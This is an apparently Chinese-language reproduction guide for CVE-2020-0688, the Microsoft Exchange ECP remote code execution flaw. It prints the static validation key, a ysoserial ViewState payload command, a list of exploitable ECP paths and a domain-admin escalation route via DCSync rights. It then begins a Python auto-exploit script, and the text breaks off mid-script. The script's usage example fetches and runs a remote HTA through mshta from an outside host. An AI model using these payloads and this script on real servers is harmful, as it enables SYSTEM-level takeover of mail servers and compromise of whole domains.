<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs24C36B3{text-align:left;margin:0pt 0pt 10pt 0pt;list-style-type:disc;color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="X3dc92c9bbd1f4889d3da612d8ac608edbfc9bae"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-0688</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Microsoft Exchange </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">该漏洞是由于</span><span class="cs8926E06">Exchange Control Panel(ECP)</span><span class="cs9C1B1871">组件中使用了静态秘钥（</span><span class="cs9FB05234">validationKey</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">decryptionKey</span><span class="cs9C1B1871">）所导致的。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">所有</span><span class="cs8926E06">Microsoft Exchange Server</span><span class="cs9C1B1871">在安装后的</span><span class="cs9FB05234">web.config</span><span class="cs9C1B1871">文件中都拥有相同的</span><span class="cs9FB05234">validationKey</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">decryptionKey</span><span class="cs9C1B1871">。这些密钥用于保证</span><span class="cs9FB05234">ViewState</span><span class="cs9C1B1871">的安全性。而</span><span class="cs9FB05234">ViewState</span><span class="cs9C1B1871">是</span><span class="cs8926E06">ASP.NET Web</span><span class="cs9C1B1871">应用以序列化格式存储在客户机上的服务端数据。客户端通过</span><span class="cs9FB05234">__VIEWSTATE</span><span class="cs9C1B1871">请求参数将这些数据返回给服务器。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">经过身份验证的攻击者可以从身份验证的</span><span class="cs9FB05234">session</span><span class="cs9C1B1871">中收集</span><span class="cs9FB05234">ViewStateUserKey</span><span class="cs9C1B1871">，并在登录请求的原始响应中获得</span><span class="cs9FB05234">__VIEWSTATEGENERATOR</span><span class="cs9C1B1871">。通过这两个值可以利用</span><span class="cs9FB05234">YSoSerial.net</span><span class="cs9C1B1871">工具生成恶意的</span><span class="cs9FB05234">ViewState</span><span class="cs9C1B1871">，从而在</span><span class="cs8926E06">ECP</span><span class="cs9C1B1871">中执行任意的</span><span class="cs8926E06">.NET</span><span class="cs9C1B1871">代码。由于</span><span class="cs8926E06">ECP</span><span class="cs9C1B1871">应用程序是以</span><span class="cs8926E06">SYSTEM</span><span class="cs9C1B1871">权限运行的，因而成功利用此漏洞的攻击者可以以</span><span class="cs8926E06">SYSTEM</span><span class="cs9C1B1871">身份执行任意代码，并完全控制目标</span><span class="cs8926E06">Exchange</span><span class="cs9C1B1871">服务器。</span></p><h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<ul style="margin-top:0;margin-bottom:0;">
			<li class="cs24C36B3"><span class="cs8926E06">Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 30</span></li><li class="cs24C36B3"><span class="cs8926E06">Microsoft Exchange Server 2013 Cumulative Update 23</span></li><li class="cs24C36B3"><span class="cs8926E06">Microsoft Exchange Server 2016 Cumulative Update 14</span></li><li class="cs24C36B3"><span class="cs8926E06">Microsoft Exchange Server 2016 Cumulative Update 15</span></li><li class="cs24C36B3"><span class="cs8926E06">Microsoft Exchange Server 2019 Cumulative Update 3</span></li><li class="cs24C36B3"><span class="cs8926E06">Microsoft Exchange Server 2019 Cumulative Update 4</span></li></ul>
		<h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">需要一个普通权限的登录账号</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">根据网上的漏洞利用方式分析，漏洞出现在</span><span class="cs8926E06">Exchange Control Panel </span><span class="cs9C1B1871">（</span><span class="cs8926E06">ECP</span><span class="cs9C1B1871">）组件中，所有</span><span class="cs8926E06">Microsoft Exchange Server</span><span class="cs9C1B1871">在安装后的</span><span class="cs9FB05234">web.config</span><span class="cs9C1B1871">文件中都拥有相同的</span><span class="cs9FB05234">validationKey</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">decryptionKey</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这些密钥用于保证</span><span class="cs8926E06">ViewState</span><span class="cs9C1B1871">的安全性，而</span><span class="cs8926E06">ViewState</span><span class="cs9C1B1871">是</span><span class="cs8926E06">ASP.NET Web</span><span class="cs9C1B1871">应用以序列化格式存储在客户机上的服务端数据。由于密钥是静态的，攻击者有了这两个密钥，就可以使用</span><span class="cs8926E06"> YSoSerial.net </span><span class="cs9C1B1871">生成序列化后的</span><span class="cs8926E06">ViewState</span><span class="cs9C1B1871">数据，从而在</span><span class="cs8926E06">Exchange Control Panel web</span><span class="cs9C1B1871">应用上执行任意</span><span class="cs8926E06">.net</span><span class="cs9C1B1871">代码。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">静态的密钥在所有</span><span class="cs8926E06">Microsoft Exchange Server</span><span class="cs9C1B1871">在安装后的</span><span class="cs9FB05234">C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\web.config</span><span class="cs9C1B1871">文件中都是相同的：</span></p><p class="cs3A447A38"><span class="cs9FB05234">validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">validationalg = SHA1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们要构造</span><span class="cs8926E06">ViewState</span><span class="cs9C1B1871">还需要</span><span class="cs9FB05234">viewstateuserkey</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">__VIEWSTATEGENERATOR</span><span class="cs9C1B1871">，</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">viewstateuserkey</span><span class="cs9C1B1871">为用户登录后的</span><span class="cs9FB05234">ASP.NET_SessionId</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Microsoft_Exchange/%ef%bc%88CVE-2020-0688%ef%bc%89Microsoft%20Exchange%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="216" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9FB05234">__VIEWSTATEGENERATOR</span><span class="cs9C1B1871">在</span><span class="cs9FB05234">/ecp/default.aspx</span><span class="cs9C1B1871">的前端页面里面直接获取：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Microsoft_Exchange/%ef%bc%88CVE-2020-0688%ef%bc%89Microsoft%20Exchange%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="158" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">当拥有了</span><span class="cs9FB05234">validationkey</span><span class="cs8926E06">,</span><span class="cs9FB05234">validationalg</span><span class="cs8926E06">,</span><span class="cs9FB05234">viewstateuserkey</span><span class="cs8926E06">,</span><span class="cs9FB05234">__VIEWSTATEGENERATOR</span><span class="cs9C1B1871">，使用</span><span class="cs8926E06">YSoSerial.net</span><span class="cs9C1B1871">生成序列化后的恶意的</span><span class="cs8926E06">ViewState</span><span class="cs9C1B1871">数据：</span></p><p class="cs3A447A38"><span class="cs9FB05234">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;2fdc8b0d-dcfb-4d0a-b464-95b9a2dcc968&quot; --isdebug &ndash;-islegacy</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Microsoft_Exchange/%ef%bc%88CVE-2020-0688%ef%bc%89Microsoft%20Exchange%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="148" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">构造以下</span><span class="cs8926E06">URL</span><span class="cs9C1B1871">，使用生成的</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">替换，使用上面所说的</span><span class="cs8926E06">value</span><span class="cs9C1B1871">值替换，最后用</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">请求发送给服务器即可。</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://www.0-sec.org/ecp/default.aspx?__VIEWSTATEGENERATOR=&lt;generator&gt;&amp;__VIEWSTATE=&lt;ViewState&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Microsoft_Exchange/%ef%bc%88CVE-2020-0688%ef%bc%89Microsoft%20Exchange%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="214" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">收到</span><span class="cs8926E06">dns</span><span class="cs9C1B1871">请求</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Microsoft_Exchange/%ef%bc%88CVE-2020-0688%ef%bc%89Microsoft%20Exchange%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="148" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">由于</span><span class="cs8926E06">Exchange Server</span><span class="cs9C1B1871">的机器用户具备</span><span class="cs8926E06">SYSTEM</span><span class="cs9C1B1871">权限，默认在域内拥有</span><span class="cs8926E06">WriteAcl</span><span class="cs9C1B1871">的权限，因此，可以通过修改</span><span class="cs8926E06">ACL</span><span class="cs9C1B1871">的</span><span class="cs9FB05234">DS-Replication-Get-Changes</span><span class="cs9C1B1871">和</span><span class="cs9FB05234">DS-Replication-Get-Changes-All</span><span class="cs9C1B1871">来赋予任何一个用户</span><span class="cs8926E06">Dcsync</span><span class="cs9C1B1871">的权限，所以这个漏洞的最大危害在于：在域内拥有一个普通用户权限的情况下，通过</span><span class="cs8926E06">Exchange Server</span><span class="cs9C1B1871">上以</span><span class="cs8926E06">system</span><span class="cs9C1B1871">用户的身份执行任意的命令，再利用</span><span class="cs8926E06">Exchange Server</span><span class="cs9C1B1871">的</span><span class="cs8926E06">WriteAcl</span><span class="cs9C1B1871">权限，从而达到域管权限。</span></p><h3 class="cs868C439D">
			<a name="附录"><span class="csD6CA00D2">附录</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">经过简单测试，已知可利用路径：</span></p><p class="cs3A447A38"><span class="cs9FB05234">/ecp/default.aspx</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=B97B4E27</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/PersonalSettings/HomePage.aspx?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=1D01FD4E</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/PersonalSettings/HomePage.aspx?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=1D01FD4E</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/Organize/AutomaticReplies.slab?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=FD338EE0</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/RulesEditor/InboxRules.slab?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=FD338EE0</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/Organize/DeliveryReports.slab?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=FD338EE0</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/MyGroups/PersonalGroups.aspx?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=A767F62B</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/MyGroups/ViewDistributionGroup.aspx?pwmcid=1&amp;id=38f4bec5-704f-4272-a654-95d53150e2ae&amp;ReturnObjectType=1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=321473B8</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/Customize/Messaging.aspx?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=9C5731F0</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/Customize/General.aspx?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=72B13321</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/Customize/Calendar.aspx?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=4AD51055</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/Customize/SentItems.aspx?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> __VIEWSTATEGENERATOR=4466B13F</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/PersonalSettings/Password.aspx?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=59543DCA</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/SMS/TextMessaging.slab?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=FD338EE0</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/TroubleShooting/MobileDevices.slab?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=FD338EE0</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/Customize/Regional.aspx?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=9097CD08</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/MyGroups/SearchAllGroups.slab?pwmcid=3&amp;ReturnObjectType=1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=FD338EE0</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">/ecp/Security/BlockOrAllow.aspx?showhelp=false&amp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">__VIEWSTATEGENERATOR=362253EF</span></p><h1 class="csAD577193">
			<a name="全自动（支持加密）"><span class="csECDA2D3">全自动（支持加密）</span></a></h1>
		<p class="cs3A447A38"><span class="cs9FB05234">CVE-2020-0688_EXP Auto trigger payload</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">python3 CVE-2020-0688_EXP.py -h &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">usage: CVE-2020-0688_EXP.py [-h] -s SERVER -u USER -p PASSWORD -c CMD [-e] &nbsp;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">optional arguments: &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-h, --help &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show this help message and exit &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-s SERVER, --server ECP Server URL Example: http://ip/owa &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-u USER, --user USER &nbsp;login account Example: domain\user &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-p PASSWORD, --password PASSWORD &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-c CMD, --cmd CMD &nbsp;&nbsp;&nbsp;&nbsp;Command u want to execute &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-e, --encrypt &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Encrypt the payload &nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">example:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">python CVE-2020-0688_EXP.py -s https://mail.x.com/ -u user@x.com -p passwd -c &quot;mshta http://1.1.1.1/test.hta&quot;</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">需要把</span><span class="cs9FB05234">ysoserial.exe</span><span class="cs8926E06"> </span><span class="cs9C1B1871">放当前目录</span></p><p class="cs6FD73CFB"><span class="cs8926E06"><a class="cs508254C" href="https://github.com/ianxtianxt/ysoserial.net/"><span class="cs4B51D5E4">https://github.com/ianxtianxt/ysoserial.net/</span></a></span></p><p class="cs3A447A38"><span class="cs9FB05234"># encoding: UTF-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import readline</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import re</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import os</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import urllib3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from urllib.parse import urlparse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from urllib.parse import quote</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">urllib3.disable_warnings()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">ysoserial_path = os.path.abspath(os.path.dirname(__file__))+&quot;/ysoserial-1.32/&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">session = requests.Session()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def get_value(url, user, pwd):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[*] Tring to login owa...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;tmp = urlparse(url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;base_url = &quot;{}://{}&quot;.format(tmp.scheme, tmp.netloc)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;paramsPost = {&quot;password&quot;: &quot;&quot;+pwd+&quot;&quot;, &quot;isUtf8&quot;: &quot;1&quot;, &quot;passwordText&quot;: &quot;&quot;, &quot;trusted&quot;: &quot;4&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;destination&quot;: &quot;&quot;+url+&quot;&quot;, &quot;flags&quot;: &quot;4&quot;, &quot;forcedownlevel&quot;: &quot;0&quot;, &quot;username&quot;: &quot;&quot;+user+&quot;&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;headers = {&quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Cookie&quot;: &quot;PrivateComputer=true; PBack=0&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cookies = {&quot;PBack&quot;: &quot;0&quot;, &quot;PrivateComputer&quot;: &quot;true&quot;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;login_url = base_url + &#39;/owa/auth.owa&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Login url: {}&quot;.format(login_url))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;login = session.post(login_url, data=paramsPost,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;headers=headers, verify=False, timeout=30)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[*] Status code: %i&quot; % login.status_code)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &quot;reason=&quot; in login.text or &quot;reason=&quot; in login.url and &quot;owaLoading&quot; in login.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[!] Login Incorrect, please try again with a different account..&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# sys.exit(1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print(str(response.text))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except Exception as e:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[!] login error , error: {}&quot;.format(e))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[+] Login successfully! &quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[*] Tring to get __VIEWSTATEGENERATOR...&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target_url = &quot;{}/ecp/default.aspx&quot;.format(base_url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;new_response = session.get(target_url, verify=False, timeout=15)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;view = re.compile(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id=&quot;__VIEWSTATEGENERATOR&quot; value=&quot;(.+?)&quot;&#39;).findall(str(new_response.text))[0]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Done! __VIEWSTATEGENERATOR:{}&quot;.format(view))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;view = &quot;B97B4E27&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[*] Can&#39;t get __VIEWSTATEGENERATOR, use default value: {}&quot;.format(view))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[*] Tring to get ASP.NET_SessionId....&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key = session.cookies[&#39;ASP.NET_SessionId&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Done! &nbsp;ASP.NET_SessionId: {}&quot;.format(key))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;except Exception as e:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[!] Get ASP.NET_SessionId error, error: {} \n[*] Exit..&quot;.format(e)) </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return view, key, base_url</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def ysoserial(cmd):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cmd = ysoserial_path+cmd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = os.popen(cmd)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = r.readlines()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return res[-1]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def main():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser = argparse.ArgumentParser()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&quot;-s&quot;, &quot;--server&quot;, required=True, help=&quot;ECP Server URL Example: http://ip/owa&quot;)</span><span 